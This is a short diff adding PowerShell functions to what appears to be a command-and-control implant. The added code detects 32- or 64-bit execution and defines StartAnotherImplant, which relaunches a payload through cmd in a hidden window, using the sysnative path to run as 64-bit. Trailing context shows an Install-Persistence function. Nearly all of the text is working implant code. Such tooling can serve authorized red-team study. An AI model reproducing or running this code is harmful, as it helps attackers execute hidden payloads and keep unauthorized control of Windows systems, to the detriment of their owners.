@@ -1,3 +1,37 @@
+function Test-Wow64() {
+    return (Test-Win32) -and (test-path env:\PROCESSOR_ARCHITEW6432)
+}
+function Test-Win64() {
+    return [IntPtr]::size -eq 8
+}
+function Test-Win32() {
+    return [IntPtr]::size -eq 4
+}
+Function CheckArchitecture
+{
+    if (Test-Win64) {
+        Write-Output "64bit implant running on 64bit machine"
+    }
+    elseif ((Test-Win32) -and (-Not (Test-Wow64))) {
+        Write-Output "32bit running on 32bit machine"
+    }
+    elseif ((Test-Win32) -and (Test-Wow64)) {
+        $global:ImpUpgrade = $True
+        Write-Output "32bit implant running on a 64bit machine, use StartAnotherImplant to upgrade to 64bit"
+    }
+    else {
+        Write-Output "Unknown Architecture Detected"
+    }
+}
+$global:ImpUpgrade = $False
+CheckArchitecture
+Function StartAnotherImplant {
+    if ($global:ImpUpgrade) {
+        start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
+    } else {
+        start-process -windowstyle hidden cmd -args "/c $payload"
+    }
+}
 Function Install-Persistence
 {
     Param ($Method)
